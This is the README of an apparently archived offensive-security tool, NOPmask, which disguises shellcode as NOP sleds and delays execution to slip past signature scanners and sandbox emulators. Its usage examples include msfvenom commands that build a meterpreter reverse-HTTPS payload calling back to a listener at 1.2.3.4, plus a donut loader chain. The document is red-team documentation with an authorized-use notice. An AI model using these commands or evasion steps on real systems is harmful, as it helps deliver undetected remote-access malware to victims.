# NOPmask

![Python](https://img.shields.io/badge/Python-3.8%2B-blue?style=flat-square&logo=python&logoColor=white)
![License](https://img.shields.io/badge/License-MIT-green?style=flat-square)
![Status](https://img.shields.io/badge/Status-Archived-lightgrey?style=flat-square)
![Platform](https://img.shields.io/badge/Platform-Linux%20%7C%20macOS%20%7C%20Windows-lightgrey?style=flat-square)
![Authorized Pentesting Only](https://img.shields.io/badge/⚠%EF%B8%8F%20Authorized%20Pentesting%20Only-critical?style=flat-square)

Shellcode obfuscation utility that encrypts payloads to resemble NOP sleds, evading signature-based detection and emulator-driven analysis.

> **Archived.** This repository is no longer under active development. Future work will be pursued in a new, separate project built from the ground up with stronger and more reliable evasion techniques.

---

## Table of Contents

- [Features](#features)
- [How It Works](#how-it-works)
- [Installation](#installation)
- [Usage](#usage)
  - [Examples](#examples)
  - [Warnings](#warnings)
- [Support](#support)
- [Formatting](#formatting)
  - [Input](#input)
  - [Output](#output)
- [Contributing](#contributing)
- [Attribution](#attribution)
- [Legal & Ethics](#legal--ethics)
- [License](#license)

---

## Features

- **NOP obfuscation**: Encrypts shellcode bytes to appear as benign NOP-sled instructions, defeating byte-pattern signature detection.
- **Emulator evasion**: Decrypts and executes the payload only on real hardware. Uses time-based techniques to exploit the speed constraints of automated sandbox analysis.
- **Cross-platform**: Runs on Linux, macOS, and Windows. Targets AMD64 and i386 architectures.
- **Output formats**: Emits obfuscated shellcode as raw binary or base64.
- **Evader mode**: Optional `-e` flag enables additional emulator-evasion stubs for more aggressive sandbox bypass.

## How It Works

```
shellcode.bin (raw input)
    │
    ▼
[XOR encryption with NOP-derived key pattern]
    │
    ▼
[Prepend decryption stub]   ← optional: emulator-evasion delay (-e)
    │
    ▼
masked_shellcode  (.bin or base64)


  — at runtime on the target —

[Emulator evasion delay]    ← exploits emulator speed constraints
    │
    ▼
[In-place decryption]       ← requires RWX memory region
    │
    ▼
[Execute original shellcode]
```

---

## Installation

**Requires Python 3.8+**

```bash
git clone https://github.com/whoamiamleo/NOPmask
cd NOPmask
pip install -r requirements.txt
```

---

## Usage

```
usage: NOPmask.py [-h] -a {amd64,i386} [-e] -i INPUT -o OUTPUT -f {base64,binary}

options:
  -h, --help                        show this help message and exit
  -a, --arch {amd64,i386}           target CPU architecture
  -e, --evader                      enable emulator evasion
  -i, --input INPUT                 path to input shellcode file
  -o, --output OUTPUT               path to output file
  -f, --format {base64,binary}      output format
```

### Examples

```bash
# Basic obfuscation
python NOPmask.py -a amd64 -i shellcode.bin -o masked.bin -f binary

# With msfvenom
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=1.2.3.4 LPORT=443 -f raw -o raw.bin
python NOPmask.py -a amd64 -i raw.bin -o masked.bin -f binary
msfvenom -p generic/custom PAYLOADFILE=masked.bin -f C -v shellcode

# With donut
donut.exe -a 2 -i .\program.exe -p "arg1 arg2 arg3" -o loader.bin
python NOPmask.py -a amd64 -i loader.bin -o masked_loader.bin -f binary
msfvenom -p generic/custom PAYLOADFILE=masked_loader.bin -f C -v shellcode
```

### Warnings

1. The decryption stub modifies the shellcode memory region during runtime and requires the allocated memory to have **Read/Write/Execute (RWX)** permissions.
2. The emulator evasion technique introduces deliberate execution delays. Allow up to one minute for complete shellcode execution. This timing mechanism is essential for bypassing sandboxed environments.
3. NOPmask is **not suitable for large shellcode**. The Python implementation is very slow for large payloads. For significantly faster performance, [JayGLXR](https://github.com/JayGLXR) wrote a C++ port: [CPP-NOPmask](https://github.com/JayGLXR/CPP-NOPmask). The supporting research is available at [From Python to SIMD: A 18,000x Performance Journey in Shellcode Obfuscation](https://www.jacobwohl.org/publications/python-to-simd-obfuscation).

---

## Support

| Requirement | Details |
|---|---|
| Operating System | Linux, macOS, Windows |
| Architecture (target) | AMD64, i386 |
| Python | 3.8+ |

## Formatting

### Input

A raw binary shellcode file (`.bin`). Any shellcode format that targets AMD64 or i386 is accepted, including output from `msfvenom` (`-f raw`) and `donut`.

### Output

The obfuscated shellcode in one of two formats, controlled by `-f`:

| Format | Description |
|---|---|
| `binary` | Raw binary file, drop-in replacement for the original shellcode |
| `base64` | Base64-encoded string, suitable for embedding in source code |

---

## Contributing

Contributions, issues, and feature requests are welcome. Feel free to check the [issues](https://github.com/whoamiamleo/NOPmask/issues) page or submit a pull request.

## Attribution

If you use NOPmask in a project or research, a mention or link back to this repository is appreciated.

- Author: Leopold von Niebelschuetz-Godlewski
- Repository: [https://github.com/whoamiamleo/NOPmask](https://github.com/whoamiamleo/NOPmask)
- License: MIT

---

## Legal & Ethics

NOPmask is intended solely for authorized security testing and research activities. Any unauthorized use is strictly prohibited. The author assumes no responsibility for misuse or damage resulting from improper or unlawful use.

---

## License

MIT License

Copyright (c) 2026 Leopold von Niebelschuetz-Godlewski

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.
